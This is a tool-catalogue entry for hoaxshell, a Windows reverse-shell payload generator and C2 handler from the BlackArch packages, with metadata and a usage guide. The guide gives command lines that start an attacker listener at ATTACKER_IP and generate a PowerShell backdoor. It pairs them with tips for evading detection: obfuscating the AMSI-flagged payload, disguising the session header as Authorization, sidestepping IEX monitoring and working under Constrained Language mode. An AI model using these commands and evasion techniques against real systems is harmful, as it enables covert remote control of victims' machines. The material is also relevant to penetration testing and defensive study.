---
name: "hoaxshell"
categories:
  - blackarch-backdoor
version: "150.e1bba89"
homepage: "https://github.com/t3l3machus/hoaxshell"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-12"
build-system: scripts
license: BSD-2-Clause
meta-checked: "2026-11-09"
github-repo: "t3l3machus/hoaxshell"
github-stars: 3504
github-pushed: "2025-01-19"
github-archived: false
github-issues: 20
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# hoaxshell

> Windows reverse shell payload generator and handler that disguises C2 traffic as ordinary http(s) requests to a beacon-like "hoax" shell.

## What it's for

hoaxshell is a Python handler that generates a PowerShell payload and then serves it a command channel over plain http(s). The victim's PowerShell periodically polls the attacker's web listener using a custom header to carry the session id, so the traffic pattern blends into ordinary web traffic instead of opening a raw TCP socket — useful when egress filtering only allows http(s). It is a command-delivery channel, not a full pty: interactive programs (`powershell`, `cmd.exe`, mimikatz without one-line invocation) hang the session. Session ids, URL paths and the header name are randomized per instance to resist signature-based detection; the base64 payload is AMSI-flagged as of October 2022, so expect to obfuscate it for real use. The author positions it for authorized testing only.

Corpus evidence for this tool is name-only (listed alongside other reverse-shell generators), so all examples below are derived from upstream documentation.

## Typical use cases

### Start an http listener and get a PowerShell payload

Launch the handler on the attacker box; it prints a base64-encoded PowerShell one-liner to run on the victim.

```
sudo python3 hoaxshell.py -s ATTACKER_IP
```

Outcome: hoaxshell starts an http listener, prints a copy-paste payload tied to this instance's random session id/header, and once the payload runs on the Windows target you get a `hoaxshell >` prompt accepting PowerShell commands.

### Harden the payload against header-based signatures

Random header names are themselves a detection cue; pass a standard header name and the Invoke-RestMethod variant to look like ordinary API traffic.

```
sudo python3 hoaxshell.py -s ATTACKER_IP -i -H "Authorization"
```

Outcome: the generated payload carries its session id in a header literally named `Authorization` and uses `Invoke-RestMethod` instead of `Invoke-WebRequest`, trading a bit of stealth in the randomization for blending in.

### Deliver commands via a file instead of Invoke-Expression

For hosts where `IEX` is blocked or monitored, have the payload write commands to a .ps1 file on the victim and execute from there.

```
sudo python3 hoaxshell.py -s ATTACKER_IP -x "C:\Users\$env:USERNAME\.local\hack.ps1"
```

Outcome: the payload creates and executes the given script path on the target instead of calling `Invoke-Expression`; inspect the raw payload (`-r` or the `rawpayload` prompt command) first to confirm the path is valid.

### Wrap the session in https with a self-signed certificate

Encrypt the channel when plaintext http inspection is a concern.

```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
sudo python3 hoaxshell.py -s ATTACKER_IP -c cert.pem -k key.pem
```

Outcome: the listener speaks https using the generated pair; the payload is longer because it prepends certificate-validation bypass code, which itself is a detection signal.

### Use a trusted certificate and a real domain

With a domain you own and a CA-signed cert, get a shorter, less suspicious https payload.

```
sudo python3 hoaxshell.py -s corp.example.com -t -c cert.pem -k key.pem
```

Outcome: the payload skips the self-signed bypass block and connects to `corp.example.com` over https, producing a markedly shorter and cleaner one-liner.

### Survive a handler restart or reconnect to a running payload

Re-attach to a session whose payload is still running on the victim after your terminal died, or reuse a previously generated payload with a new instance.

```
sudo python3 hoaxshell.py -s ATTACKER_IP -g
```

Outcome: grab-session mode re-establishes the beacon; start it with the same http/https mode, port and other settings as the original session or the payload will not match.

### Operate against a host in PowerShell Constrained Language mode

Generate a payload variant that works when the victim restricts PowerShell.

```
sudo python3 hoaxshell.py -s ATTACKER_IP -cm
```

Outcome: the payload functions under Constrained Language mode at the cost of some stdout decoding accuracy on the handler side.

*No corpus evidence — derived from upstream documentation.* (Corpus mentions are name-only tool-list entries.)
